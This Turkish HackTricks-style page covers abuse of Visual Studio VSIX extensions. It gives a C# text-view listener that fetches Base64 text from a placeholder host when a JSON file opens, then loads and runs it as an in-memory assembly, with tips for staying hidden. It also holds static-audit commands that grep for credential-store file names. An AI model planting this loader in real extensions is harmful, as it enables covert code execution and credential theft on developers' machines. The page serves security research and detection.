# Visual Studio VSIX Eklentisinin Kötüye Kullanımı

{{#include ../banners/hacktricks-training.md}}

Bir Visual Studio eklentisi, sıradan düzenleyici etkinliklerini oturum açmış kullanıcının kimliğiyle kod çalıştırma fırsatına dönüştürebilir. Kötü amaçlı bir VSIX, benzer görünümlü bir yayıncı veya güvenliği ihlal edilmiş bir eklenti güncellemesi, normal kurulum kanalları aracılığıyla kullanıcıya ulaşabilir. Yönetici istemiyle yapılan kurulum, kullanıcının onay verdiği bir kurulum yoludur; otomatik bir ayrıcalık yükseltme değildir.<sup>[[1]](#references)</sup>

## Çalıştırma modeli

Klasik VSSDK eklentileri genellikle `devenv.exe` içinde çalışır. Daha yeni `VisualStudio.Extensibility` modeli, modern .NET eklentilerini çoğunlukla işlem dışında çalıştırır: Visual Studio çağrıları, özel bir `Microsoft.ServiceHub.Host.Extensibility` işlemine yönlendirir. Bu, IDE kararlılığını yalıtır ancak eklentiyi kullanıcının Windows izinlerinden **sandbox ile yalıtmaz**. Tam yürütülebilir dosya adı, `ServiceHub.Host.Extensibility.arm64.exe` gibi bir mimari son eki içerebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Sıradan düzenleyici etkinliklerinde tetikleme

Bir eklenti, yalnızca dikkat çekici bir menü komutu sunmak yerine `ITextViewOpenClosedListener` uygulayabilir. `TextViewOpenedAsync` geri çağrısı, eşleşen belgeler için çağrılırken `TextViewExtensionConfiguration.AppliesTo` etkinleştirmeyi JSON gibi yaygın bir türle sınırlayabilir. Gerçek bir biçimlendirici veya linter, dosya açıldığında yan etki olarak ikinci bir eylem çalıştırırken duyurulan işlevini de yerine getirebilir.<sup>[[1]](#references)[[3]](#references)</sup>

Aşağıdaki sadeleştirilmiş örüntü, önemli yürütme noktalarını gösterir; açıklık için meşru biçimlendiriciyi ve hata işlemeyi içermez.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Olayla tetiklenen, bellekte çalışan yönetilen assembly yükleyicisi</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Bu zincir Base64 metnini indirir, assembly baytlarına çözer, bunları `MemoryStream` üzerinden toplanabilir bir `AssemblyLoadContext` ile yükler, yansıtılan `EntryPoint`'i parametresiz ya da `string[]` ile çağırır, asenkron giriş noktalarını bekler ve bağlamı boşaltır. İkinci aşama diske yazılmaz; ancak VSIX ve birincil extension DLL disk artefaktları olarak kalır. Base64, özgünlük veya gizlilik sağlamaz; ayrıca HTTP kullanımı, yol üzerindeki bir saldırganın yanıtı değiştirmesine olanak tanır.<sup>[[1]](#references)</sup>

Operasyonel varyasyonlar arasında, hazırlama başarısız olduğunda duyurulan özelliğin çalışmaya devam etmesi için tüm istisnaları yok saymak veya düzenlemelerden sonra tetiklenmek üzere `ITextViewChangedListener` kullanmak yer alır. Kod extension host içinde çalışır ve bu kullanıcı için kullanılabilir yönetilen API'leri, P/Invoke'u, dosyaları, kimlik bilgilerini ve alt süreçleri kullanabilir.<sup>[[1]](#references)</sup>

Yerel plugin otomatik yüklemesine dayalı, editöre özgü ilgili bir yürütme yüzeyi için bkz.:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace ve dağıtım güveninin kötüye kullanılması

Bir VSIX doğrudan paylaşılan/oltalanan bir dosya olarak, web Marketplace'ten veya Visual Studio'nun gömülü Marketplace tarayıcısı üzerinden gelebilir. Esas olarak benzersizliği ve ayrılmış sözcükler listesini denetleyen publisher kaydı, görsel olarak çağrışım yapan publisher kimliklerine olanak tanıyabilir; zaten güvenilen bir publisher'ı veya extension'ı ele geçirmek ise daha da etkilidir, çünkü yüklenmiş bir kullanıcı tabanını devralır. Marketplace yüklemesi Visual Studio Installer'ı başlatır ve indirilen VSIX'i geçici olarak `%LOCALAPPDATA%\Temp` altına yerleştirir; `payload.vsix` meşru olarak da kullanıldığından, yalnızca dosya adı bir gösterge değildir.<sup>[[1]](#references)</sup>

MDSec, bir extension'ı doğrudan yükleyen Visual Studio URL protokolü tespit etmedi. Operatörün yine de kullanıcının VSIX'i yüklemesini/güvenmesini sağlaması veya mevcut bir extension'ın dağıtım yolunu ele geçirmesi gerekir. `AllUsers` paketi Visual Studio yükleme klasörüne yüklenir ve yükseltme isteyebilir; ancak bu, yönetici veya SYSTEM erişimine otomatik bir yol değil, normal ve onaya dayalı bir yükleyici davranışıdır.<sup>[[1]](#references)[[4]](#references)</sup>

### Büyük ölçekte statik denetim

VSIX paketleri genellikle ZIP kapsayıcılarıdır; bu nedenle güvenli bir Marketplace inceleme hattı paketleri listeleyebilir, extension kodunu **yüklemeden** açabilir, manifestleri ayrıştırabilir, yürütülebilir yüzeyleri belirleyebilir ve yönetilen assembly'leri `ilspycmd` ile decompile edebilir. Yaygın paketlenmiş bağımlılıkları hariç tuttuktan sonra extension'a ait assembly'lere öncelik verin; ardından kimlik bilgisi deposuyla ilgili dizeleri dosya okuma ve ağ üzerinden gönderme, kodlama ve gönderme, indirme ve yürütme, kimlik bilgisi yöneticisi ve ağ erişimi ya da ekran görüntüsü alma ve gönderme gibi davranış kümeleriyle ilişkilendirin.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Ayrıca, her yürütme yüzeyinin yönetilen kod olduğunu varsaymak yerine yerel DLL'leri, MSBuild targets'larını, script'leri, T4 şablonlarını ve yükleyici payload'larını da envantere alın. Şüpheli davranışları manifestte belirtilen amaçla karşılaştırın; telemetri ve meşru güncelleyiciler, veri sızdırma veya hazırlık faaliyetlerine benzeyebilir. Yalnızca statik inceleme; paketlenmiş, gizlenmiş, dinamik olarak çözümlenen ve etkin olmayan kodları gözden kaçırır. Yalnızca en son sürümü incelemek de kötü amaçlı eski sürümlerin gözden kaçmasına yol açar.<sup>[[1]](#references)</sup>

Ayrı bir proje yükleme saldırısı, VSIX yüklemeden kötü amaçlı bir [MSBuild `GetFrameworkPaths` target'ı](visual-studio-project-msbuild-execution.md) çalıştırabilir.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio Eklentileri Yeniden İncelendi](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility Hakkında](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Bir VSIX paketinin anatomisi](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET aracı](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel Kampanyası Irak Altyapısını Hedef Alıyor](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
